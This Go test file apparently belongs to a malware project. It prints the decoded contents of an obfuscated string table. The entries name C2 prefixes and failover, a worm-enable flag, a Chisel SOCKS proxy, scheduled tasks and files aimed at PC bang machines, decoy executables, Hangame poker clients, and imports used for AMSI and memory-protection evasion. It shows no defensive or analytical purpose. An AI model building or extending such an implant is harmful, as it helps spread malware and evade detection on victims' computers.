package main

import (
	"fmt"
	"reflect"
	"testing"
	"unsafe"
)

func ptrOf(v interface{}) unsafe.Pointer {
	return unsafe.Pointer(reflect.ValueOf(v).UnsafePointer())
}

func TestDumpTables(t *testing.T) {
	var vals = map[string][]byte{
		"eC2LabTaskPrefix": eC2LabTaskPrefix, "eC2LabTmpPrefix": eC2LabTmpPrefix,
		"eChiselSocksExe": eChiselSocksExe, "eChiselToolPath": eChiselToolPath,
		"eHangameProfileID": eHangameProfileID, "eSvcName": eSvcName,
		"eC2Failover": eC2Failover, "eC2FailoverThreshold": eC2FailoverThreshold, "eC2WormEnable": eC2WormEnable,
		"ePCBangTask1": ePCBangTask1, "ePCBangDisp1": ePCBangDisp1, "ePCBangDesc1": ePCBangDesc1,
		"ePCBangFile1": ePCBangFile1, "ePCBangDir1": ePCBangDir1,
		"ePCBangTask2": ePCBangTask2, "ePCBangDisp2": ePCBangDisp2, "ePCBangDesc2": ePCBangDesc2,
		"ePCBangFile2": ePCBangFile2, "ePCBangDir2": ePCBangDir2,
		"ePCBangTask3": ePCBangTask3, "ePCBangDisp3": ePCBangDisp3, "ePCBangDesc3": ePCBangDesc3,
		"ePCBangFile3": ePCBangFile3, "ePCBangDir3": ePCBangDir3,
		"eDecoyExe1": eDecoyExe1, "eDecoyExe2": eDecoyExe2, "eDecoyExe3": eDecoyExe3, "eDecoyExe4": eDecoyExe4, "eDecoyExe5": eDecoyExe5,
		"eDecoyTitle1": eDecoyTitle1, "eDecoyTitle2": eDecoyTitle2, "eDecoyTitle3": eDecoyTitle3, "eDecoyTitle4": eDecoyTitle4,
		"eEvKernel32": eEvKernel32, "eEvNtdll": eEvNtdll, "eEvAmsi": eEvAmsi,
		"eEvModuleFirst": eEvModuleFirst, "eEvModuleNext": eEvModuleNext, "eEvToolhelpSnap": eEvToolhelpSnap,
		"eEvCloseHandle": eEvCloseHandle, "eEvVirtualProtect": eEvVirtualProtect,
		"eGameIDPoker7": eGameIDPoker7, "eTitlePoker7": eTitlePoker7, "eImgPoker7": eImgPoker7,
		"eImgHanStarter": eImgHanStarter, "eImgHanStarter2": eImgHanStarter2, "eImgHgameSetup": eImgHgameSetup,
		"eGameIDBaduki": eGameIDBaduki, "eTitleBaduki": eTitleBaduki, "eImgBaduki": eImgBaduki,
		"eGameIDDuel": eGameIDDuel, "eTitleDuelPoker": eTitleDuelPoker, "eImgDuelPoker": eImgDuelPoker,
		"eGameIDHighLow": eGameIDHighLow, "eTitleHighLow": eTitleHighLow, "eImgHighLow2": eImgHighLow2,
		"eGameIDLas": eGameIDLas, "eTitleLasPoker": eTitleLasPoker, "eImgLasPoker": eImgLasPoker,
	}
	_ = ptrOf
	for k, v := range vals {
		fmt.Printf("%-24s = %q\n", k, xob(v))
	}
}
